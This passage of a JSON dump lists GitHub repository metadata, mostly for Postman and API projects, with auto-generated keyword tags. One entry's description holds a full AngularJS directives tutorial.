    "pulled": 1,
    "tags": []
  },
  {
    "id": 91486511,
    "name": "PostmanToSwagger",
    "full_name": "mikeatphizzle/PostmanToSwagger",
    "description": null,
    "fork": false,
    "created_at": "2017-05-16T17:35:25Z",
    "updated_at": "2020-03-30T17:36:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28737593,
    "owner_login": "mikeatphizzle",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/28737593?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 162207368,
    "name": "SwaggerToPostman",
    "full_name": "dangerousplay/SwaggerToPostman",
    "description": null,
    "fork": false,
    "created_at": "2018-12-18T00:29:53Z",
    "updated_at": "2018-12-19T16:27:41Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24483153,
    "owner_login": "dangerousplay",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/24483153?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 112542858,
    "name": "swagger2postman",
    "full_name": "Bdthomson/swagger2postman",
    "description": null,
    "fork": false,
    "created_at": "2017-11-30T00:16:30Z",
    "updated_at": "2018-06-13T17:09:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7236299,
    "owner_login": "Bdthomson",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/7236299?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 125013417,
    "name": "Marketplace-API",
    "full_name": "automat-project/Marketplace-API",
    "description": "AutoMat Marketplace API files",
    "fork": false,
    "created_at": "2018-03-13T07:57:55Z",
    "updated_at": "2019-06-10T16:28:33Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 36631401,
    "owner_login": "automat-project",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/36631401?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "place"
    ]
  },
  {
    "id": 134072979,
    "name": "NodeExpressApp",
    "full_name": "Nishit2011/NodeExpressApp",
    "description": "Building Restful APIs and triggering them via Postman. Updating and writing the data onto a file",
    "fork": false,
    "created_at": "2018-05-19T15:14:09Z",
    "updated_at": "2018-05-19T15:17:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 11172889,
    "owner_login": "Nishit2011",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/11172889?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "file",
      "writing",
      "onto",
      "trigger",
      "triggering"
    ]
  },
  {
    "id": 151507943,
    "name": "nodeHerokuServer",
    "full_name": "BubbaMachina/nodeHerokuServer",
    "description": "My tutorial for myself on how to use node, and deploy to heroku with as little files as possible. Postman is front end for now, and Mongo DB is connected to this as well",
    "fork": false,
    "created_at": "2018-10-04T02:20:39Z",
    "updated_at": "2018-10-04T15:05:46Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23363955,
    "owner_login": "BubbaMachina",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/23363955?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "node",
      "files",
      "front",
      "connect",
      "tutorial",
      "front end",
      "heroku",
      "little",
      "connected",
      "myself"
    ]
  },
  {
    "id": 229267049,
    "name": "Riskcovry-Second-Task-Phone-Number-",
    "full_name": "Manimsn/Riskcovry-Second-Task-Phone-Number-",
    "description": "Node API to read and search the matched word from a txt file. Use Postman to view the results",
    "fork": false,
    "created_at": "2019-12-20T13:09:17Z",
    "updated_at": "2019-12-23T08:35:24Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 48318047,
    "owner_login": "Manimsn",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/48318047?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "read",
      "view",
      "search",
      "result",
      "results",
      "match",
      "matched"
    ]
  },
  {
    "id": 152341219,
    "name": "Eng-Connector-React-Nodejs-Project",
    "full_name": "jolie1191/Eng-Connector-React-Nodejs-Project",
    "description": "- A small social network with authentication, profiles, dashborad, posts  - More Details:   - Create backedn API with Node/Express   - Test with Postman   - Explore the Bootstrap Theme   - Implement React and connect with the backend   - Implement Redux for state management   - Prepare, build & deploy to Heroku",
    "fork": false,
    "created_at": "2018-10-10T00:54:09Z",
    "updated_at": "2019-03-08T12:03:36Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 35779922,
    "owner_login": "jolie1191",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/35779922?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "auth",
      "files",
      "build",
      "manage",
      "authentication",
      "stat",
      "connect",
      "backend",
      "management",
      "small",
      "network",
      "posts",
      "social",
      "profile",
      "profiles",
      "backed",
      "dashborad"
    ]
  },
  {
    "id": 225753441,
    "name": "Task-management-app",
    "full_name": "KenC1014/Task-management-app",
    "description": "This contains all server side Node.js files for task management application. This is a pure backend application. All the endpoints are accessible via Postman. Express server and Mongoose are used.",
    "fork": false,
    "created_at": "2019-12-04T01:38:27Z",
    "updated_at": "2020-01-29T08:02:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26831001,
    "owner_login": "KenC1014",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/26831001?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "application",
      "server",
      "contain",
      "endpoint",
      "points",
      "files",
      "manage",
      "endpoints",
      "backend",
      "access",
      "task",
      "side",
      "management",
      "pure"
    ]
  },
  {
    "id": 221553327,
    "name": "Social-network",
    "full_name": "VPihalov/Social-network",
    "description": "It is a social network app for developers that includes authentication, profiles, forum posts. App is based on MERN stack (MongoDB, Mongoose, React, Redux, Nodejs, Express). Main implementations are React Hooks, Redux, Postman, Bcrypt, Heroku, Git flow",
    "fork": false,
    "created_at": "2019-11-13T21:17:21Z",
    "updated_at": "2020-03-09T14:49:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 41261016,
    "owner_login": "VPihalov",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/41261016?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "based",
      "develop",
      "implement",
      "auth",
      "files",
      "authentication",
      "implementation",
      "developer",
      "stack",
      "developers",
      "includes",
      "network",
      "posts",
      "social",
      "profile",
      "forum",
      "profiles",
      "implementations"
    ]
  },
  {
    "id": 94979636,
    "name": "blueman",
    "full_name": "tagip/blueman",
    "description": "Docker image that converts an API Blueprint AST file to a Postman collection",
    "fork": false,
    "created_at": "2017-06-21T08:10:33Z",
    "updated_at": "2017-07-26T19:21:10Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 28352361,
    "owner_login": "tagip",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/28352361?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "convert",
      "image",
      "print",
      "converts"
    ]
  },
  {
    "id": 40326550,
    "name": "Angular-Directive-Project",
    "full_name": "sn0112358/Angular-Directive-Project",
    "description": "Angular-Directive-Project Directives range from very basic to extremely complex. This project will build up to some somewhat difficult directives. Keep in mind that the format we're learning for directives is the same format used to build some extremely complex things in angular. Using directives often and well is one way to show you're a talented developer.  Starting Out  We've included only a few things for you to begin with. index.html, app.js, styles.css. At this point the best way to get more comfortable with angular is to initialize an app without relying heavily on boilerplate code (reusable code that starts out your projects for you).  You'll notice that in the index.html we've included the angular-route CDN. Yes, we'll be using angular's router here. Put an ng-view into your index.html.  In your app.js set up a config and set up our first route for when a user is at the '/home' url. If you're having trouble remembering how to set up the router go look at how you set up the router on the previous project. One way these projects will be beneficial to you is allowing you to look back at something *you** did and seeing how you got that something to work.* You may also want add an otherwise that defaults to /home. Create a controller and a template file for this route in your app folder. Don't forget to include the controller as a script in your index.html Check that everything is hooked up correctly. Try adding a div with some text in your home template just to make sure it's showing up. Once you've got that going you're ready to start on some directives. Now let's make our directive. We'll start with a simple one that we can use to display information passed to it.  Step 1. Start your directive  Woot. When you're initializing your directive just remember that it works very similarly to how you start up a controller or a service. It can also be very helpful to think of your directive as a route.  Create your directive. You'll use the directive method on your angular module. It takes two arguments, the name string and the callback function, which will return the object that represents your directive. When naming your directive give it a name with two words; dirDisplay would be nice, but anything works. Just remember it's best practice to give a directive a camel case name so that it's clear in your html what it is. Also we're going to need a template html for our directive. We could do it inline, but let's make another file instead. Just name it something that makes sense for the name of your directive and put it in the same directory as your directive file. For your template just make a  and inside a  tag that says User. Now in your home route html add in your directive. It will look like this if you named it dirDisplay:  Start up your app and go to the home route. Check and make sure you see User where your directive was placed. If you're not seeing it at this point it could mean a few things. Here's some more common issues. You didn't link your directive in your index as a script. Your name for your directive doesn't match the name in your html. Remember camel case becomes snake case so myDirective becomes . You're file path to your html template is wrong. You have to think of file paths in angular as relative to the index. Here's some code to see just for this part, and just for the directive's js file.  var app = angular.module('directivePractice'); app.directive('dirDisplay', function(){   return {     templateUrl: 'app/directives/dirDisplay.html'   }; }); What we're returning is the directive object. You won't see anymore code in this tutorial so it's important you get things working right and refer back to what you've already done to advance from now on.  Step 2. Advancing directives  Your directive should be loaded up now, but it's not really doing much. Let's make it better.  In your home controller. Make a variable on your $scope called user. Set it's value to {   name: \"Geoff McMammy\",   age: 43,   email: \"geofdude@gmail.com\" } Now inside your directive's html specifically inside the  tags display our new user's name. Then inside maybe some  tags display his email and age. This is going to work exactly the same as if it was just inside your home controller. Reload the page and make sure it works. This is still very cosmetic and really not all that useful. It needs functionality.  Add into your directive's object the link property. The link property's value is a function definition that takes (generally) three parameters. scope, element, and attributes. Unlike in other places with angular injection these parameter names don't carry meaning. The first parameter will always represent your $scope for that directive, the second will always be the element that wraps your whole directive, and the third will always be an object containing all the properties and values of the attributes on your directive in the dom. Try the following to get a feel for all three.  Add two attributes to your directive in your html. Like this -  Now in the link property you've added console.log the three parameters in the function. You'll see an object for scope that should look identical to the $scope of your html function. For element you'll see an object the represents the DOM wrapper for your directive. For attributes you'll see an object that will look like this:  {   test: \"myTest\",   myCheck: \"checkItOut\" } An important thing to notice is how it has again converted snake case to camel case for you. my-check became myCheck. Don't forget this. You'll run into this issue one day. It counts for both attributes and directive names.  To feel some of what the link function could do let's try this.  Add a ng-show to both the email and age wrappers. This should be familiar to you. Now inside your link function add a click event listener to your element property. It's going to look just like jQuery. element.on('click', function(){  }) Inside the click listener's callback add a toggle for the ng-show property you passed in. Along with a console.log to make sure things are connecting when you click. Try it out. Don't call for a mentor when it doesn't work. Let's talk about that first. You should see the console.log firing, but why isn't it toggling. This is going to be a common problem when working with the link function and event listeners. What we have here is an angular digest problem. The value is changing on the scope object, but the change isn't being reflected by our DOM. That's because angular isn't aware of the change yet. Anytime we cause an event to happen using something like jQuery or even angular's jQLite we need to let angular know that we've made a change.  Add this line of code in place of your console.log, scope.$apply(). Now try it out. It should be working now, so if you're still having issues it's time to debug. What we've done is forced angular to run it's digest cycle. This is where angular checks the scope object for changes and then applies those to the DOM. This is another good lesson to learn for later. You'll most likely hit this when making changes to your element using event listeners.  Step 3. Directive's re-usability.  Now our directive has some extremely basic functionality. One of a directive's greatest advantages though is its ability to be placed anywhere and still be functional. Let's say instead we had a list of users instead of just one.  Change the $scope property in your home controller to be users and give it this array as its value: [  {    name: \"Geoff McMammy\",    age: 43,    email: \"geofdude@gmail.com\",    city: \"Provo\"  },  {    name: \"Frederick Deeder\",    age: 26,    email: \"fredeed@gmail.com\",    city: \"Austin\"  },  {    name: \"Spencer Rentz\",    age: 35,    email: \"spencerrentz@gmail.com\",    city: \"Sacramento\"  },  {    name: \"Geddup Ngo\",    age: 43,    email: \"geddupngo@gmail.com\",    city: \"Orlando\"  },  {    name: \"Donst Opbie Leevin\",    age: 67,    email: \"gernee@gmail.com\",    city: \"Phoenix\"  } ] Now in your home HTML add a ng-repeat to the directive call. Tell it to repeat for each user in users. Reload your page. It's working! But why? How does each directive instance know what information to display?  In the link function console.log the scope parameter. Make sure it's outside of your click listener. You'll see five print outs in your console. Open up any one of them and look to the bottom. Open up the user property. It's exactly what we would want! But again why would that be the case? Don't get too caught up in this next bit if it's too hard to understand, but the ng-repeat is essentially making new tiny scope objects for each individual user in our users array. Now each of our directives is still getting a user property on the scope object just like the directive wanted in the beginning. Woot.  Step 4. Ramp it up with Isolate Scope.  Directives can do so much more. So let's make that happen. That means we should make.... a new directive!!! This directive's purpose will be to display a selected User and the weather in his/her/its location. Link it up just like the last one.  Create a js file for our directive and name it dirWeather. Make an html file named dirWeather.html. Link it up in your index.html and add the template to your new directive object. In your directive's template give it an  tag that says Weather just so we can know it's working. Above your ng-repeat on dirDisplay add your new dirWeather directive. If it's not working check the instructions above as to some common reasons why before asking a mentor for help. If you're seeing the Weather text on your page then we're ready to try out the dreaded Isolate Scope. The isolate scope object is one of the stranger API's in angular. I'm sorry but it is. Just refer to this for now.  scope: {  string: '@',  link: '=',  func: '&' } The properties on the scope object represent the attributes on the directive in the html. Our example scope object here would look something like this in the html.  The hard part here is the @, =, and &. They each have very important and distinct meanings.  @ says take in my attribute value as a string. = says take in my attribute value as a two-way bound variable from the parent scope. & says take in my attribute value as a reference to a function on the parent scope. It's also critical to point out that once you add a scope object you have no isolated your directive's scope. Meaning, aside from the values passed in through attributes, this directive has no connection to the $scope of its parent.  That being said let's isolate our directive's scope. :worried:  Add the scope property to your dirWeather. Give it the value of an object with a property of currentUser whose value is '='. Remember in your html this will look like current-user. This is the third time I've said so don't expect it again. This means that whatever comes into the currentUser attribute is going to be a value of the parent's scope object.  For now test this out by passing in users[0]. Find a way to show that users information inside your dirWeather's html. Remember inside your directive now the user is represented by currentUser. Step 5. &? &!?  The '=' value on your scope object has created a two-way binding between users[0] and currentUser. Now let's try out the '&'.  On your home controller add a function called getWeather. It takes one parameter called city. This function will make a call to a service so we'll need to create that. Make a weather service. Name it something cool and creative like weatherService. Inside the weather service make a function called getWeather that also takes one parameter, city. Make an $http get to this url - 'http://api.openweathermap.org/data/2.5/weather?q=' After the q= add on the city parameter. If you want you can test this out in postman. See what kind of data you get back. If it's the weather of that city then... you win! Use $q to return a promise that only resolves with the data you want. Temperature (preferably not in Kelvin) and the weather description. Use console.log on the data coming from the $http request to get to what you want. You'll need to add both on an object that you resolve your new promise with. On your home controller have it return the result of invoking the get getWeather function on the service. You should be returning a promise. Now in your home route's HTML pass in the getWeather function to the dirWeather directive through an attribute called weather-call. Add the attribute to your isolate scope object. That was a lot of linking, but let's walk through it. Your controller has a function linked to the service, which is in turn linked to your directive. So if you run the weatherCall function in your directive it will go through your controller to your service and then back.  Now things get a little bit tricky. Angular's way of passing along arguments through a directive to your controller are tricky, but once you understand how to do it, it's not hard. I'm going to give an example here of how it works.   Here's how it would look in your HTML. But where's the data supposed to be coming from? It seems that you'd rather be able to pass in data from your directive. Well you still can, you just have to essentially tell angular what do use as an argument to replace data when it calls that function in your controller. The actualy function call inside the directive will look like this.  $scope.passFunc({data: wantedData}) So what you'll do is pass in an object where the property name is what the argument is named in the HTML where you call the directive. That might sound confusing, but just look at the two code blocks above for a pattern. Note that pass-func becomes $scope.passFunc and data is being replaced with wantedData with the {data: wantedData} object. In our directive we want to replace city in the attribute call, for something else inside the directive. You'll follow the same pattern as above.  For now let's get things set up for that function call.  Add to the dirWeather directive object a property called controller. It's value will be a function. Yes, this is a controller specifically for your one directive. It works the same as any other controller, except you don't give it a name. It's $scope object will only be accessible within an instance of your directive. Don't forget to inject $scope in the function.  Inside your controller function run the weatherCall function with the city property from the currentUser on your $scope. Here's where you need to make sure you've passed in a city argument in the attribute function call, and then replace that with your currentUser's city using an object with a city property. The function call should return a promise, so call .then afterward and add the data onto your $scope to display both the weather and temperature of the currentUser's city. The properties can be named whatever makes sense to you.  You may also want to find a way to get rid of all the decimal places on your temperature. Now you should have everything hooked up so it shows Geoff's data and the weather data for Provo. But is that good enough?  Step 6. Ramping up our ramp up.  Now let's change this so it shows the weather data for whichever user we select. We're going to need to use '&' again.  Make a function on the home controller that takes in a parameter and sets a property on the $scope to be that parameter. Maybe you see where this is going.  We want to get this function into our dirDisplay controller. But in order to do that we need to isolate dirDisplay's scope. This also means we need to pass in each individual user through the scope object as well.  To make it easier on ourselves, let's pass the current user from our ng-repeat into our directive through a user attribute. This way we can leave our two-way bindings as they are. Also pass our new function that sets our current user from our home controller into our directive through a setUser attribute.  You'll need to add an argument in there again. Go with user. Your scope object in dirDisplay should have two properties. setUser with the value of '&' and user with the value of '='. As before we're going to need to do some tricky stuff to get our argument back to our controller.  Call the setUser function inside our click event listener and pass in an object the sets our user argument to be the user on our directive's scope object. If you've forgotten this part go back up and take a look at how you did it before or the example in this README.  Whatever user you click on now should show up in the dirWeather directive as the current user. But we're missing one thing, we want to be able to see the weather for that user too. We'll have to do one more thing that will seem a little bit tricky at first, but it's good to learn if you don't know it already since it's actually used quite frequently.  We need to step up a change listener on our currentUser in the dirWeather directive. We'll use angular's $watch functionality. $watch is a method on your $scope that will watch for changes in a variable you give it. It works in two ways.  $scope.$watch('property', function(value){  console.log(\"When $scope.property changes its new value is: \", value) }); And  $scope.$watch(function(){  return myVar }, function(value){  console.log(\"When myVar changes its new value is: \", value); }); Remove the immediate function call that we have in there now. Maybe just comment it out for now because we'll use it in a bit. Now call the $watch method on your scope and have it watch currentUser. Either way of using $watch is fine. Have its callback run the $scope.weatherCall function just like you had it before.  One thing to note is that $scope.$watch will always run once to begin with. Since that's what we want here it's great, but just be aware of that.  If you've reached this point congratulate yourself. You've messed with some serious stuff today, namely directives. There are still a lot of things about directives that we can't possibly cover in a single project. If you like what we've done so far then you're in a good place to keep going. A developer who understands directives well can build a really clean looking code base. Just look at your home.html. It could have just two lines in it. If you're feeling good move on now to Step 7.  Step 7. Finishing touches  Try to work out these problems on your own.  There should be a way to let the user know that the weather data is loading. Something that appears while our $http request is retrieving our data. The $http request shouldn't fire on both opening and closing a user's information. A color change for the currently active user would be nicer than showing that user's info inside the dirWeather modal. Or at least less redundant. Whatever else you want. We still haven't explored transclusion and ng-transclude so give that a try if you're feeling adventurous. Just know that it's a way for deciding where to put the HTML child elements of a directive. It's cool stuff that can involve some criss-crossing of scopes.",
    "fork": false,
    "created_at": "2015-08-06T20:56:18Z",
    "updated_at": "2019-03-11T21:13:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 14,
    "watchers": 0,
    "score": 1,
    "owner_id": 13667207,
    "owner_login": "sn0112358",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13667207?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "data",
      "request",
      "form",
      "file",
      "script",
      "service",
      "call",
      "http",
      "user",
      "develop",
      "code",
      "example",
      "contain",
      "format",
      "convert",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "function",
      "load",
      "calls",
      "spec",
      "list",
      "star",
      "read",
      "import",
      "users",
      "learn",
      "rent",
      "more",
      "plate",
      "view",
      "config",
      "start",
      "connect",
      "email",
      "very",
      "functional",
      "method",
      "struct",
      "info",
      "developer",
      "play",
      "need",
      "access",
      "name",
      "working",
      "html",
      "converte",
      "learning",
      "module",
      "check",
      "side",
      "tutorial",
      "infor",
      "long",
      "open",
      "object",
      "print",
      "ever",
      "information",
      "template",
      "case",
      "result",
      "control",
      "esse",
      "text",
      "problem",
      "practice",
      "making",
      "to do",
      "place",
      "between",
      "link",
      "under",
      "right",
      "specific",
      "showing",
      "along",
      "variable",
      "included",
      "lines",
      "getting",
      "desc",
      "within",
      "folder",
      "functionality",
      "order",
      "advance",
      "parameter",
      "following",
      "controller",
      "reference",
      "those",
      "done",
      "ready",
      "debug",
      "needs",
      "find",
      "objects",
      "repl",
      "style",
      "console",
      "useful",
      "note",
      "angular",
      "containing",
      "current",
      "should",
      "single",
      "location",
      "easier",
      "connection",
      "sets",
      "default",
      "common",
      "event",
      "connecting",
      "description",
      "display",
      "both",
      "router",
      "best",
      "words",
      "directory",
      "usable",
      "projects",
      "things",
      "another",
      "complex",
      "added",
      "being",
      "third",
      "select",
      "fire",
      "wrapper",
      "doing",
      "correct",
      "path",
      "cause",
      "while",
      "media",
      "going",
      "keep",
      "replace",
      "stuff",
      "home",
      "boiler",
      "expect",
      "issue",
      "still",
      "having",
      "instead",
      "boilerplate",
      "three",
      "definition",
      "currently",
      "adding",
      "better",
      "helpful",
      "talk",
      "little",
      "match",
      "lesson",
      "ember",
      "makes",
      "instruction",
      "previous",
      "city",
      "named",
      "general",
      "instance",
      "familiar",
      "important",
      "become",
      "forge",
      "explore",
      "mean",
      "inside",
      "properties",
      "onto",
      "passing",
      "listen",
      "weather",
      "something",
      "names",
      "reusable",
      "inject",
      "array",
      "least",
      "shows",
      "comfortable",
      "tiny",
      "always",
      "clean",
      "cool",
      "five",
      "namely",
      "invoking",
      "initial",
      "returning",
      "actually",
      "wrappers",
      "wraps",
      "talent",
      "whole",
      "element",
      "directives",
      "elements",
      "essential",
      "sense",
      "arent",
      "much",
      "every",
      "wanted"
    ]
  },
  {
    "id": 218320846,
    "name": "xhr_google_drive_file_access",
    "full_name": "fazleyrabby/xhr_google_drive_file_access",
    "description": "XHR response from Google drive file using Google API and postman",
    "fork": false,
    "created_at": "2019-10-29T15:30:24Z",
    "updated_at": "2019-10-29T18:57:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26044286,
    "owner_login": "fazleyrabby",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26044286?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "response",
      "drive"
    ]
  },
  {
    "id": 195978153,
    "name": "dockerized-java-api",
    "full_name": "mixaverros88/dockerized-java-api",
    "description": "A RESTful API with JAX-RS. This repo containes one dockerfile in order to spin up a container.",
    "fork": false,
    "created_at": "2019-07-09T09:33:30Z",
    "updated_at": "2020-02-22T16:00:47Z",
    "stargazers_count": 2,
    "watchers_count": 2,
    "forks": 0,
    "watchers": 2,
    "score": 1,
    "owner_id": 11536917,
    "owner_login": "mixaverros88",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/11536917?v=4",
    "pulled": 1,
    "tags": [
      "repo",
      "file",
      "contain",
      "docker",
      "order",
      "container",
      "containes"
    ]
  },
  {
    "id": 142798122,
    "name": "Multithread-Web-Server",
    "full_name": "xzhang007/Multithread-Web-Server",
    "description": "Developed a web server in Java capable of handling HTTP requests and parsing those requests, and sending out various HTTP responses. • Handles basic user authentication and CGI which could execute concurrently using multithreading and synchronized method. And it could send binary files like images over network. • Using GitHub repository to control versions and Postman to test as well as factory design pattern.",
    "fork": false,
    "created_at": "2018-07-29T21:54:31Z",
    "updated_at": "2018-11-07T23:21:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16105149,
    "owner_login": "xzhang007",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/16105149?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "request",
      "file",
      "repos",
      "repository",
      "server",
      "requests",
      "user",
      "sign",
      "auth",
      "files",
      "send",
      "read",
      "authentication",
      "response",
      "rent",
      "version",
      "image",
      "method",
      "control",
      "design",
      "various",
      "images",
      "responses",
      "sync",
      "handling",
      "sending",
      "those",
      "actor",
      "current",
      "network",
      "execute",
      "currently",
      "reading",
      "versions",
      "parsing",
      "capable"
    ]
  },
  {
    "id": 65542288,
    "name": "Entity-Framework-Core-Relationship-Web-API",
    "full_name": "ranovladimir/Entity-Framework-Core-Relationship-Web-API",
    "description": "Here is a sample project running on ASP .NET CORE using : - Entity Framework Core in command line (dotnet ef) - Relationships with Data annotation and Fluent API - WEB API (CRUD) => I using PostMan for test. To Getting started, please read the readme.txt file into the project.",
    "fork": false,
    "created_at": "2016-08-12T09:42:35Z",
    "updated_at": "2016-10-05T03:26:04Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 17979737,
    "owner_login": "ranovladimir",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/17979737?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "file",
      "line",
      "sample",
      "star",
      "read",
      "running",
      "start",
      "command",
      "command line",
      "started",
      "please",
      "notation",
      "readme",
      "dotnet"
    ]
  },
  {
    "id": 199515056,
    "name": "PointcloudBug",
    "full_name": "anjalee-narenthiren/PointcloudBug",
    "description": "Run the index.html file. You will have to use postman to get an access key and update the accessToken variable on line 33 of main.js.",
    "fork": false,
    "created_at": "2019-07-29T19:30:17Z",
    "updated_at": "2019-07-29T19:32:01Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 42633976,
    "owner_login": "anjalee-narenthiren",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/42633976?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "line",
      "update",
      "access",
      "html",
      "main",
      "variable"
    ]
  },
  {
    "id": 58537377,
    "name": "postman-webhooks",
    "full_name": "rohankar/postman-webhooks",
    "description": "Modify file through webhooks right from postman",
    "fork": false,
    "created_at": "2016-05-11T10:59:14Z",
    "updated_at": "2016-05-11T10:59:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 2379402,
    "owner_login": "rohankar",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/2379402?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "right",
      "webhook",
      "webhooks"
    ]
  }
]